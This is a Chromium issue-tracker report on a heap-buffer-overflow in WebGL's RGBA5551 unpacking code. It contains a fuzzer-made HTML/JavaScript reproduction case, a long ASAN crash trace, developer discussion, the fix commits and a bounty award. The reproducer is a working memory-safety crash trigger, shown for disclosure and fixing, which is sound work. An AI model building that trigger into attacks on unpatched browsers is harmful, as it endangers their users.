# Security: heap-buffer-overflow in UnpackOneRowOfRGBA5551LittleToRGBA8

| Field | Value |
|-------|-------|
| **Issue ID** | [40089290](https://issues.chromium.org/issues/40089290) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink>WebGL |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | cl...@gmail.com |
| **Assignee** | zm...@chromium.org |
| **Created** | 2017-10-12 |
| **Bounty** | $1,000.00 |

## Description

VULNERABILITY DETAILS
The following testcase crashes the latest ASAN build of Chrome.

VERSION
Chrome Version: asan-linux-release-508269
Operating System: Linux 64-bit

REPRODUCTION CASE
<script>
function start() {
        try{o621=document.createElementNS('http://www.w3.org/1999/xhtml','canvas')}catch(e){};undefined;
        try{o1369=o621.getContext('webgl2',{alpha: false,depth: false,stencil: true,premultipliedAlpha: true,})}catch(e){};undefined;
        try{o1857=new Uint16Array(32)}catch(e){};undefined;
        try{o1369.pixelStorei(o1369.UNPACK_ROW_LENGTH,4)}catch(e){};undefined;
        try{o1369.pixelStorei(o1369.UNPACK_PREMULTIPLY_ALPHA_WEBGL,6)}catch(e){};undefined;
        try{o1969=o1369.createTexture()}catch(e){};undefined;
        try{o1369.bindTexture(o1369.TEXTURE_2D,o1969)}catch(e){};undefined;
        try{o1369.texSubImage2D(o1369.TEXTURE_2D,4,7,5,8,5,o1369.RGB,o1369.UNSIGNED_SHORT_5_5_5_1,o1857)}catch(e){};undefined;
}
</script>
<body onload="start()"></body>

FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION
Type of crash: tab
Crash State: ASAN output:

=================================================================
==17844==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x606000051de0 at pc 0x0000113e882f bp 0x7fff095f2c30 sp 0x7fff095f2c28
READ of size 16 at 0x606000051de0 thread T0 (content_shell)
    #0 0x113e882e in UnpackOneRowOfRGBA5551LittleToRGBA8 third_party/WebKit/Source/platform/graphics/cpu/x86/WebGLImageConversionSSE.h:59:28
    #1 0x113e882e in Unpack<21, unsigned short, unsigned char> third_party/WebKit/Source/platform/graphics/gpu/WebGLImageConversion.cpp:476
    #2 0x113e882e in Convert<blink::WebGLImageConversion::DataFormat::kDataFormatRGBA5551, blink::WebGLImageConversion::DataFormat::kDataFormatRGBA5551, blink::WebGLImageConversion::AlphaOp::kAlphaDoPremultiply> third_party/WebKit/Source/platform/graphics/gpu/WebGLImageConversion.cpp:2557
    #3 0x113e882e in Convert<blink::WebGLImageConversion::DataFormat::kDataFormatRGBA5551, blink::WebGLImageConversion::DataFormat::kDataFormatRGBA5551> third_party/WebKit/Source/platform/graphics/gpu/WebGLImageConversion.cpp:2418
    #4 0x113e882e in Convert<blink::WebGLImageConversion::DataFormat::kDataFormatRGBA5551> third_party/WebKit/Source/platform/graphics/gpu/WebGLImageConversion.cpp:2388
    #5 0x113e882e in Convert third_party/WebKit/Source/platform/graphics/gpu/WebGLImageConversion.cpp:2355
    #6 0x113e882e in blink::WebGLImageConversion::PackPixels(unsigned char const*, blink::WebGLImageConversion::DataFormat, unsigned int, unsigned int, blink::IntRect const&, int, unsigned int, int, unsigned int, unsigned int, blink::WebGLImageConversion::AlphaOp, void*, bool) third_party/WebKit/Source/platform/graphics/gpu/WebGLImageConversion.cpp:3139
    #7 0x113e948d in blink::WebGLImageConversion::ExtractTextureData(unsigned int, unsigned int, unsigned int, unsigned int, unsigned int, bool, bool, void const*, WTF::Vector<unsigned char, 0ul, WTF::PartitionAllocator>&) third_party/WebKit/Source/platform/graphics/gpu/WebGLImageConversion.cpp:3050:8
    #8 0x11540234 in blink::WebGLRenderingContextBase::TexImageHelperDOMArrayBufferView(blink::WebGLRenderingContextBase::TexImageFunctionID, unsigned int, int, int, int, int, int, int, unsigned int, unsigned int, int, int, int, blink::DOMArrayBufferView*, blink::WebGLRenderingContextBase::NullDisposition, unsigned int) third_party/WebKit/Source/modules/webgl/WebGLRenderingContextBase.cpp:4651:12
    #9 0x1154b226 in blink::WebGLRenderingContextBase::texSubImage2D(unsigned int, int, int, int, int, int, unsigned int, unsigned int, blink::MaybeShared<blink::DOMArrayBufferView>) third_party/WebKit/Source/modules/webgl/WebGLRenderingContextBase.cpp:5582:3
    #10 0x113b1480 in blink::WebGL2RenderingContextBase::texSubImage2D(unsigned int, int, int, int, int, int, unsigned int, unsigned int, blink::MaybeShared<blink::DOMArrayBufferView>) third_party/WebKit/Source/modules/webgl/WebGL2RenderingContextBase.cpp:1386:30
    #11 0x1113a5da in blink::WebGL2RenderingContextV8Internal::texSubImage2D8Method(v8::FunctionCallbackInfo<v8::Value> const&) out/Release/gen/blink/bindings/modules/v8/V8WebGL2RenderingContext.cpp:10254:9
    #12 0x110daa67 in blink::WebGL2RenderingContextV8Internal::texSubImage2DMethod(v8::FunctionCallbackInfo<v8::Value> const&) out/Release/gen/blink/bindings/modules/v8/V8WebGL2RenderingContext.cpp
    #13 0x4449620 in v8::internal::FunctionCallbackArguments::Call(void (*)(v8::FunctionCallbackInfo<v8::Value> const&)) v8/src/api-arguments.cc:25:3
    #14 0x464bcfe in v8::internal::MaybeHandle<v8::internal::Object> v8::internal::(anonymous namespace)::HandleApiCallHelper<false>(v8::internal::Isolate*, v8::internal::Handle<v8::internal::HeapObject>, v8::internal::Handle<v8::internal::HeapObject>, v8::internal::Handle<v8::internal::FunctionTemplateInfo>, v8::internal::Handle<v8::internal::Object>, v8::internal::BuiltinArguments) v8/src/builtins/builtins-api.cc:112:36
    #15 0x4649342 in v8::internal::Builtin_Impl_HandleApiCall(v8::internal::BuiltinArguments, v8::internal::Isolate*) v8/src/builtins/builtins-api.cc:142:5
    #16 0x7ff3ac28469c  (<unknown module>)
    #17 0x7ff3ac2de02f  (<unknown module>)
    #18 0x7ff3ac2de02f  (<unknown module>)
    #19 0x7ff3ac2dc7d8  (<unknown module>)
    #20 0x7ff3ac2840fe  (<unknown module>)
    #21 0x4f5875a in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, bool, v8::internal::Handle<v8::internal::Object>, v8::internal::Handle<v8::internal::Object>, int, v8::internal::Handle<v8::internal::Object>*, v8::internal::Handle<v8::internal::Object>, v8::internal::Execution::MessageHandling) v8/src/execution.cc:146:13
    #22 0x4f57d33 in CallInternal v8/src/execution.cc:182:10
    #23 0x4f57d33 in v8::internal::Execution::Call(v8::internal::Isolate*, v8::internal::Handle<v8::internal::Object>, v8::internal::Handle<v8::internal::Object>, int, v8::internal::Handle<v8::internal::Object>*) v8/src/execution.cc:192
    #24 0x44ad8c0 in v8::Function::Call(v8::Local<v8::Context>, v8::Local<v8::Value>, int, v8::Local<v8::Value>*) v8/src/api.cc:5436:7
    #25 0xcdfd46f in blink::V8ScriptRunner::CallFunction(v8::Local<v8::Function>, blink::ExecutionContext*, v8::Local<v8::Value>, int, v8::Local<v8::Value>*, v8::Isolate*) third_party/WebKit/Source/bindings/core/v8/V8ScriptRunner.cpp:687:17
    #26 0xeb0e434 in blink::V8LazyEventListener::CallListenerFunction(blink::ScriptState*, v8::Local<v8::Value>, blink::Event*) third_party/WebKit/Source/bindings/core/v8/V8LazyEventListener.cpp:114:8
    #27 0xce14374 in blink::V8AbstractEventListener::InvokeEventHandler(blink::ScriptState*, blink::Event*, v8::Local<v8::Value>) third_party/WebKit/Source/bindings/core/v8/V8AbstractEventListener.cpp:147:20
    #28 0xce13de0 in blink::V8AbstractEventListener::HandleEvent(blink::ScriptState*, blink::Event*) third_party/WebKit/Source/bindings/core/v8/V8AbstractEventListener.cpp:104:3
    #29 0xce13a35 in blink::V8AbstractEventListener::handleEvent(blink::ExecutionContext*, blink::Event*) third_party/WebKit/Source/bindings/core/v8/V8AbstractEventListener.cpp:92:3
    #30 0xeb0a162 in blink::EventTarget::FireEventListeners(blink::Event*, blink::EventTargetData*, blink::HeapVector<blink::RegisteredEventListener, 1ul>&) third_party/WebKit/Source/core/dom/events/EventTarget.cpp:771:15
    #31 0xeb07dd9 in blink::EventTarget::FireEventListeners(blink::Event*) third_party/WebKit/Source/core/dom/events/EventTarget.cpp:632:29
    #32 0xeedf051 in blink::LocalDOMWindow::DispatchEvent(blink::Event*, blink::EventTarget*) third_party/WebKit/Source/core/frame/LocalDOMWindow.cpp:1523:14
    #33 0xeeddeb3 in blink::LocalDOMWindow::DispatchLoadEvent() third_party/WebKit/Source/core/frame/LocalDOMWindow.cpp:1470:5
    #34 0xeedd8a6 in blink::LocalDOMWindow::DispatchWindowLoadEvent() third_party/WebKit/Source/core/frame/LocalDOMWindow.cpp:385:3
    #35 0xeede3f6 in blink::LocalDOMWindow::DocumentWasClosed() third_party/WebKit/Source/core/frame/LocalDOMWindow.cpp:389:3
    #36 0xe6c8280 in blink::Document::ImplicitClose() third_party/WebKit/Source/core/dom/Document.cpp:3179:18
    #37 0xe6c774d in blink::Document::CheckCompleted() third_party/WebKit/Source/core/dom/Document.cpp:3273:5
    #38 0x1038b502 in blink::FrameLoader::FinishedParsing() third_party/WebKit/Source/core/loader/FrameLoader.cpp:431:26
    #39 0xe6f370a in blink::Document::FinishedParsing() third_party/WebKit/Source/core/dom/Document.cpp:5793:21
    #40 0xf694d19 in end third_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:934:18
    #41 0xf694d19 in AttemptToRunDeferredScriptsAndEnd third_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:946
    #42 0xf694d19 in blink::HTMLDocumentParser::PrepareToStopParsing() third_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:245
    #43 0xf69c6d5 in blink::HTMLDocumentParser::ProcessTokenizedChunkFromBackgroundParser(std::__1::unique_ptr<blink::HTMLDocumentParser::TokenizedChunk, std::__1::default_delete<blink::HTMLDocumentParser::TokenizedChunk> >) third_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp
    #44 0xf6968cb in blink::HTMLDocumentParser::PumpPendingSpeculations() third_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:608:9
    #45 0xd79501c in Run base/callback.h:92:12
    #46 0xd79501c in operator() third_party/WebKit/Source/platform/wtf/Functional.h:252
    #47 0xd79501c in blink::TaskHandle::Runner::Run(blink::TaskHandle const&) third_party/WebKit/Source/platform/WebTaskRunner.cpp:75
    #48 0x82bb104 in Run base/callback.h:64:12
    #49 0x82bb104 in base::debug::TaskAnnotator::RunTask(char const*, base::PendingTask*) base/debug/task_annotator.cc:57
    #50 0x630965f in blink::scheduler::TaskQueueManager::ProcessTaskFromWorkQueue(blink::scheduler::internal::WorkQueue*, bool, blink::scheduler::LazyNow, base::TimeTicks*) third_party/WebKit/Source/platform/scheduler/base/task_queue_manager.cc:531:19
    #51 0x63029df in blink::scheduler::TaskQueueManager::DoWork(bool) third_party/WebKit/Source/platform/scheduler/base/task_queue_manager.cc:322:13
    #52 0x82bb104 in Run base/callback.h:64:12
    #53 0x82bb104 in base::debug::TaskAnnotator::RunTask(char const*, base::PendingTask*) base/debug/task_annotator.cc:57
    #54 0x832bee4 in base::MessageLoop::RunTask(base::PendingTask*) base/message_loop/message_loop.cc:392:25
    #55 0x832d48d in DeferOrRunPendingTask base/message_loop/message_loop.cc:404:5
    #56 0x832d48d in base::MessageLoop::DoWork() base/message_loop/message_loop.cc:450
    #57 0x833612f in base::MessagePumpDefault::Run(base::MessagePump::Delegate*) base/message_loop/message_pump_default.cc:37:31
    #58 0x83acc04 in base::RunLoop::Run() base/run_loop.cc:118:14
    #59 0x12fa5966 in content::RendererMain(content::MainFunctionParams const&) content/renderer/renderer_main.cc:220:23
    #60 0x64be0f9 in content::RunZygote(content::MainFunctionParams const&, content::ContentMainDelegate*) content/app/content_main_runner.cc:358:14
    #61 0x64c1e8a in content::ContentMainRunnerImpl::Run() content/app/content_main_runner.cc:710:12
    #62 0xcc47dfe in service_manager::Main(service_manager::MainParams const&) services/service_manager/embedder/main.cc:469:29
    #63 0x4236e33 in content::ContentMain(content::ContentMainParams const&) content/app/content_main.cc:19:10
    #64 0x2be7804 in main content/shell/app/shell_main.cc:48:10
    #65 0x7ff3e120382f in __libc_start_main /build/glibc-bfm8X4/glibc-2.23/csu/../csu/libc-start.c:291

0x606000051de0 is located 0 bytes to the right of 64-byte region [0x606000051da0,0x606000051de0)
allocated by thread T0 (content_shell) here:
    #0 0x2bbaf63 in __interceptor_malloc (/home/nils/fuzzer3/asan-linux-release-508269/content_shell+0x2bbaf63)
    #1 0xce0c4e3 in PartitionAllocGenericFlags base/allocator/partition_allocator/partition_alloc.h:803:18
    #2 0xce0c4e3 in AllocateMemoryWithFlags third_party/WebKit/Source/platform/wtf/typed_arrays/ArrayBufferContents.cpp:117
    #3 0xce0c4e3 in WTF::ArrayBufferContents::AllocateMemoryOrNull(unsigned long, WTF::ArrayBufferContents::InitializationPolicy) third_party/WebKit/Source/platform/wtf/typed_arrays/ArrayBufferContents.cpp:127
    #4 0x554aad2 in v8::internal::JSTypedArray::MaterializeArrayBuffer(v8::internal::Handle<v8::internal::JSTypedArray>) v8/src/objects.cc:18932:42
    #5 0xd0cd009 in blink::V8Uint16Array::ToImpl(v8::Local<v8::Object>) out/Release/gen/blink/bindings/core/v8/V8Uint16Array.cpp:67:47
    #6 0xd0c9807 in blink::V8ArrayBufferView::ToImpl(v8::Local<v8::Object>) out/Release/gen/blink/bindings/core/v8/V8ArrayBufferView.cpp:96:12
    #7 0x1113a530 in ToMaybeShared<blink::MaybeShared<blink::DOMArrayBufferView> > third_party/WebKit/Source/bindings/core/v8/V8BindingForCore.h:643:7
    #8 0x1113a530 in blink::WebGL2RenderingContextV8Internal::texSubImage2D8Method(v8::FunctionCallbackInfo<v8::Value> const&) out/Release/gen/blink/bindings/modules/v8/V8WebGL2RenderingContext.cpp:10246
    #9 0x110daa67 in blink::WebGL2RenderingContextV8Internal::texSubImage2DMethod(v8::FunctionCallbackInfo<v8::Value> const&) out/Release/gen/blink/bindings/modules/v8/V8WebGL2RenderingContext.cpp
    #10 0x4449620 in v8::internal::FunctionCallbackArguments::Call(void (*)(v8::FunctionCallbackInfo<v8::Value> const&)) v8/src/api-arguments.cc:25:3
    #11 0x464bcfe in v8::internal::MaybeHandle<v8::internal::Object> v8::internal::(anonymous namespace)::HandleApiCallHelper<false>(v8::internal::Isolate*, v8::internal::Handle<v8::internal::HeapObject>, v8::internal::Handle<v8::internal::HeapObject>, v8::internal::Handle<v8::internal::FunctionTemplateInfo>, v8::internal::Handle<v8::internal::Object>, v8::internal::BuiltinArguments) v8/src/builtins/builtins-api.cc:112:36
    #12 0x4649342 in v8::internal::Builtin_Impl_HandleApiCall(v8::internal::BuiltinArguments, v8::internal::Isolate*) v8/src/builtins/builtins-api.cc:142:5
    #13 0x7ff3ac28469c  (<unknown module>)
    #14 0x7ff3ac2de02f  (<unknown module>)
    #15 0x7ff3ac2de02f  (<unknown module>)
    #16 0x7ff3ac2dc7d8  (<unknown module>)
    #17 0x7ff3ac2840fe  (<unknown module>)
    #18 0x4f5875a in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, bool, v8::internal::Handle<v8::internal::Object>, v8::internal::Handle<v8::internal::Object>, int, v8::internal::Handle<v8::internal::Object>*, v8::internal::Handle<v8::internal::Object>, v8::internal::Execution::MessageHandling) v8/src/execution.cc:146:13
    #19 0x4f57d33 in CallInternal v8/src/execution.cc:182:10
    #20 0x4f57d33 in v8::internal::Execution::Call(v8::internal::Isolate*, v8::internal::Handle<v8::internal::Object>, v8::internal::Handle<v8::internal::Object>, int, v8::internal::Handle<v8::internal::Object>*) v8/src/execution.cc:192
    #21 0x44ad8c0 in v8::Function::Call(v8::Local<v8::Context>, v8::Local<v8::Value>, int, v8::Local<v8::Value>*) v8/src/api.cc:5436:7
    #22 0xcdfd46f in blink::V8ScriptRunner::CallFunction(v8::Local<v8::Function>, blink::ExecutionContext*, v8::Local<v8::Value>, int, v8::Local<v8::Value>*, v8::Isolate*) third_party/WebKit/Source/bindings/core/v8/V8ScriptRunner.cpp:687:17
    #23 0xeb0e434 in blink::V8LazyEventListener::CallListenerFunction(blink::ScriptState*, v8::Local<v8::Value>, blink::Event*) third_party/WebKit/Source/bindings/core/v8/V8LazyEventListener.cpp:114:8
    #24 0xce14374 in blink::V8AbstractEventListener::InvokeEventHandler(blink::ScriptState*, blink::Event*, v8::Local<v8::Value>) third_party/WebKit/Source/bindings/core/v8/V8AbstractEventListener.cpp:147:20
    #25 0xce13de0 in blink::V8AbstractEventListener::HandleEvent(blink::ScriptState*, blink::Event*) third_party/WebKit/Source/bindings/core/v8/V8AbstractEventListener.cpp:104:3
    #26 0xce13a35 in blink::V8AbstractEventListener::handleEvent(blink::ExecutionContext*, blink::Event*) third_party/WebKit/Source/bindings/core/v8/V8AbstractEventListener.cpp:92:3
    #27 0xeb0a162 in blink::EventTarget::FireEventListeners(blink::Event*, blink::EventTargetData*, blink::HeapVector<blink::RegisteredEventListener, 1ul>&) third_party/WebKit/Source/core/dom/events/EventTarget.cpp:771:15
    #28 0xeb07dd9 in blink::EventTarget::FireEventListeners(blink::Event*) third_party/WebKit/Source/core/dom/events/EventTarget.cpp:632:29
    #29 0xeedf051 in blink::LocalDOMWindow::DispatchEvent(blink::Event*, blink::EventTarget*) third_party/WebKit/Source/core/frame/LocalDOMWindow.cpp:1523:14
    #30 0xeeddeb3 in blink::LocalDOMWindow::DispatchLoadEvent() third_party/WebKit/Source/core/frame/LocalDOMWindow.cpp:1470:5
    #31 0xeedd8a6 in blink::LocalDOMWindow::DispatchWindowLoadEvent() third_party/WebKit/Source/core/frame/LocalDOMWindow.cpp:385:3
    #32 0xeede3f6 in blink::LocalDOMWindow::DocumentWasClosed() third_party/WebKit/Source/core/frame/LocalDOMWindow.cpp:389:3
    #33 0xe6c8280 in blink::Document::ImplicitClose() third_party/WebKit/Source/core/dom/Document.cpp:3179:18

SUMMARY: AddressSanitizer: heap-buffer-overflow third_party/WebKit/Source/platform/graphics/cpu/x86/WebGLImageConversionSSE.h:59:28 in UnpackOneRowOfRGBA5551LittleToRGBA8
Shadow bytes around the buggy address:
  0x0c0c80002360: fd fd fd fd fd fd fd fd fa fa fa fa 00 00 00 00
  0x0c0c80002370: 00 00 00 00 fa fa fa fa 00 00 00 00 00 00 00 00
  0x0c0c80002380: fa fa fa fa fd fd fd fd fd fd fd fa fa fa fa fa
  0x0c0c80002390: fd fd fd fd fd fd fd fa fa fa fa fa fd fd fd fd
  0x0c0c800023a0: fd fd fd fa fa fa fa fa fd fd fd fd fd fd fd fd
=>0x0c0c800023b0: fa fa fa fa 00 00 00 00 00 00 00 00[fa]fa fa fa
  0x0c0c800023c0: 00 00 00 00 00 00 00 00 fa fa fa fa fa fa fa fa
  0x0c0c800023d0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c0c800023e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c0c800023f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c0c80002400: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==17844==ABORTING


## Timeline

### cl...@chromium.org (2017-10-12)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5020352030965760.

### wf...@chromium.org (2017-10-12)

[Empty comment from Monorail migration]

[Monorail components: Blink>WebGL]

### cl...@chromium.org (2017-10-17)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=6695877325619200.

### ke...@chromium.org (2017-10-18)

cloudfuzzer@: does this reproduce consistently for you? We haven't been able to verify the crash so far.

### cl...@gmail.com (2017-10-19)

I just tried again with asan-linux-release-510106 and it still reproduces with content_shell and chrome. I am running on a Ubuntu 64bit system and the X display is a X vnc server.

### sh...@chromium.org (2017-10-19)

Thank you for providing more feedback. Adding requester "kenrb@chromium.org" to the cc list and removing "Needs-Feedback" label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ke...@chromium.org (2017-10-20)

kbr@: Do you know anyone who might be able to make sense of the stack trace above?

### kb...@chromium.org (2017-10-20)

Mo just fixed another bug in the pixel packing code in https://crbug.com/chromium/765469. Mo, do you think you could take this? Please reassign to me if not. Thanks.


### zm...@chromium.org (2017-10-20)

Sure. I'll take a look.

### zm...@chromium.org (2017-10-20)

[Empty comment from Monorail migration]

### ke...@chromium.org (2017-10-20)

Setting flags based on information in the report.

### zm...@chromium.org (2017-10-20)

The bug is because the data pack/unpack algorithm in WebGLImageConversion.cpp isn't taking into considerations of ES3 UNPACK parameters, like row_length, etc.

Usually it's fine because service side code handles everything correctly. However, when we set FLIP_Y or UNMULTIPLY_ALPHA WebGL specific params, the client side needs to handle them.

### zm...@chromium.org (2017-10-20)

Here is my suggestion: since both command buffer and MANGLE will have a "WebGL" mode, why don't we move the handling of FLIP_Y and UNMULTIPLY_ALPHA to the service side? This way, we can consolidate handling of all UNPACK params (ROW_LENGTH, SKIP_*, etc) in one place rather than duplicating their handling in multiple places?

### zm...@chromium.org (2017-10-20)

I'll hold off in this until I receive feedback from Kai, Ken, Geoff.

### kb...@chromium.org (2017-10-20)

Personally in Chrome I would prefer to keep this code in the untrusted renderer process as opposed to moving it to the GPU process. It's a large chunk of code with assembly versions having been contributed by external contributors, and bugs in it on the GPU process side would be more serious than in the renderer. Does that seem workable?


### ge...@chromium.org (2017-10-23)

ANGLE implements the fliping and pre/unmultiplying in the CHROMIUM_copy_texture extension and it's used by Microsoft so we can't modify this very easily.  That said, I don't mind if Chrome updates to no longer use these parameters (and possibly asserts that they are the defaults on the service side).

### zm...@chromium.org (2017-10-23)

Geoff: the short term fix is what Ken suggested, putting more code to handle ES3 unpack params in Blink side.

Command buffer client side currently handles the flip_y so it's not sent to service side.

The longer term solution I have in mind is actually to push premultiply_alpha to service side handling through a shader. So that means only color-renderable formats. That will reduce our binary size quite a bit.

So I am confused about your reply: are you saying ANGLE already handles premultiply_alpha? If yes, then that's perfect. If not, are you saying it's hard to put in support?

### ge...@chromium.org (2017-10-23)

I think I was confused about the multiple paths here.  ANGLE handles the premultiply_alpha flag of the glCopyTextureCHROMIUM entry point but not the generic WebGL unpack parameter.

I don't have a strong opionion on where the code lives as long as it can function with only the arguments of the glTexImage command and doesn't rely on any other texture state.

### es...@chromium.org (2017-11-09)

Friendly ping from the security sheriff; are there any updates on this bug?

### zm...@chromium.org (2017-11-09)

There won't be a tiny fix that we can merge back to earlier branches.

The fix will be implementing the missing code path, which will be a relatively large CL. It's on my next TODO.

to geofflang: The reason I ask for ANGLE side implementation of handling premultiply_alpha is, after I finish the client side handling, in the long run, I want to implement the handling of these params with color renderable formats on the service side using shaders. Then we might be able to delete a large sum of client side pack/unpack code and reduce the Chrome binary quite a bit (right now we use template and generate quite some code for this handling).

### ge...@chromium.org (2017-11-09)

Ok, I'm worried this will be difficult to implement in the passthrough command decoder because we'll have to do some extra state tracking of texture and unpack state.  Maybe it's possible to simply upload the original data to a a staging texture and use CopyTextureCHROMIUM to do the pre/unmultiply/flip to the final destination?  That could still live in the client side.

### cl...@chromium.org (2017-11-29)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=4901687444897792.

### pa...@chromium.org (2017-11-29)

Are we sure this is a Medium, and not a High?

### ke...@chromium.org (2017-11-29)

The CF test case shows an out-of-bounds read, which we normally rate Medium severity.

Is the question in https://crbug.com/chromium/774174#c23 asking whether this bug has the potential to allow out-of-bounds writes or other kinds of memory corruption? That would be useful information if so.

### zm...@chromium.org (2017-12-05)

CL is uploaded: https://chromium-review.googlesource.com/c/chromium/src/+/808665

### bu...@chromium.org (2017-12-06)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/9b99a43fc119a2533a87e2357cad8f603779a7b9

commit 9b99a43fc119a2533a87e2357cad8f603779a7b9
Author: Zhenyao Mo <zmo@chromium.org>
Date: Wed Dec 06 04:21:22 2017

Implement 2D texture uploading from client array with FLIP_Y or PREMULTIPLY_ALPHA.

BUG=774174
TEST=https://github.com/KhronosGroup/WebGL/pull/2555
R=kbr@chromium.org

Cq-Include-Trybots: master.tryserver.chromium.android:android_optional_gpu_tests_rel;master.tryserver.chromium.linux:linux_layout_tests_slimming_paint_v2;master.tryserver.chromium.linux:linux_optional_gpu_tests_rel;master.tryserver.chromium.mac:mac_optional_gpu_tests_rel;master.tryserver.chromium.win:win_optional_gpu_tests_rel
Change-Id: I4f4e7636314502451104730501a5048a5d7b9f3f
Reviewed-on: https://chromium-review.googlesource.com/808665
Commit-Queue: Zhenyao Mo <zmo@chromium.org>
Reviewed-by: Kenneth Russell <kbr@chromium.org>
Cr-Commit-Position: refs/heads/master@{#522003}
[modify] https://crrev.com/9b99a43fc119a2533a87e2357cad8f603779a7b9/third_party/WebKit/Source/modules/webgl/WebGL2RenderingContextBase.cpp
[modify] https://crrev.com/9b99a43fc119a2533a87e2357cad8f603779a7b9/third_party/WebKit/Source/modules/webgl/WebGL2RenderingContextBase.h
[modify] https://crrev.com/9b99a43fc119a2533a87e2357cad8f603779a7b9/third_party/WebKit/Source/modules/webgl/WebGLRenderingContextBase.cpp
[modify] https://crrev.com/9b99a43fc119a2533a87e2357cad8f603779a7b9/third_party/WebKit/Source/modules/webgl/WebGLRenderingContextBase.h
[modify] https://crrev.com/9b99a43fc119a2533a87e2357cad8f603779a7b9/third_party/WebKit/Source/platform/graphics/gpu/WebGLImageConversion.cpp
[modify] https://crrev.com/9b99a43fc119a2533a87e2357cad8f603779a7b9/third_party/WebKit/Source/platform/graphics/gpu/WebGLImageConversion.h


### zm...@chromium.org (2017-12-06)

This turned out to be a smaller change than I originally anticipated.

We should definitely merge back to M64.

### sh...@chromium.org (2017-12-07)

[Empty comment from Monorail migration]

### sh...@chromium.org (2017-12-07)

Your change meets the bar and is auto-approved for M64. Please go ahead and merge the CL to branch 3282 manually. Please contact milestone owner if you have questions.
Owners: cmasso@(Android), cmasso@(iOS), kbleicher@(ChromeOS), abdulsyed@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### bu...@chromium.org (2017-12-07)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/813ea0bef5f89d691cc8a93a8456cef6bbc08239

commit 813ea0bef5f89d691cc8a93a8456cef6bbc08239
Author: Zhenyao Mo <zmo@chromium.org>
Date: Thu Dec 07 19:26:35 2017

Implement 2D texture uploading from client array with FLIP_Y or PREMULTIPLY_ALPHA.

BUG=774174
TEST=https://github.com/KhronosGroup/WebGL/pull/2555
R=​kbr@chromium.org

Cq-Include-Trybots: master.tryserver.chromium.android:android_optional_gpu_tests_rel;master.tryserver.chromium.linux:linux_layout_tests_slimming_paint_v2;master.tryserver.chromium.linux:linux_optional_gpu_tests_rel;master.tryserver.chromium.mac:mac_optional_gpu_tests_rel;master.tryserver.chromium.win:win_optional_gpu_tests_rel
Change-Id: I4f4e7636314502451104730501a5048a5d7b9f3f
Reviewed-on: https://chromium-review.googlesource.com/808665
Commit-Queue: Zhenyao Mo <zmo@chromium.org>
Reviewed-by: Kenneth Russell <kbr@chromium.org>
Cr-Original-Commit-Position: refs/heads/master@{#522003}(cherry picked from commit 9b99a43fc119a2533a87e2357cad8f603779a7b9)
Reviewed-on: https://chromium-review.googlesource.com/814698
Reviewed-by: Zhenyao Mo <zmo@chromium.org>
Cr-Commit-Position: refs/branch-heads/3282@{#75}
Cr-Branched-From: 5fdc0fab22ce7efd32532ee989b223fa12f8171e-refs/heads/master@{#520840}
[modify] https://crrev.com/813ea0bef5f89d691cc8a93a8456cef6bbc08239/third_party/WebKit/Source/modules/webgl/WebGL2RenderingContextBase.cpp
[modify] https://crrev.com/813ea0bef5f89d691cc8a93a8456cef6bbc08239/third_party/WebKit/Source/modules/webgl/WebGL2RenderingContextBase.h
[modify] https://crrev.com/813ea0bef5f89d691cc8a93a8456cef6bbc08239/third_party/WebKit/Source/modules/webgl/WebGLRenderingContextBase.cpp
[modify] https://crrev.com/813ea0bef5f89d691cc8a93a8456cef6bbc08239/third_party/WebKit/Source/modules/webgl/WebGLRenderingContextBase.h
[modify] https://crrev.com/813ea0bef5f89d691cc8a93a8456cef6bbc08239/third_party/WebKit/Source/platform/graphics/gpu/WebGLImageConversion.cpp
[modify] https://crrev.com/813ea0bef5f89d691cc8a93a8456cef6bbc08239/third_party/WebKit/Source/platform/graphics/gpu/WebGLImageConversion.h


### aw...@google.com (2017-12-11)

[Empty comment from Monorail migration]

### aw...@chromium.org (2017-12-14)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### aw...@google.com (2017-12-14)

Thanks as ever! The VRP Panel decided to reward $1,000 for this report. Cheers!

### aw...@chromium.org (2017-12-14)

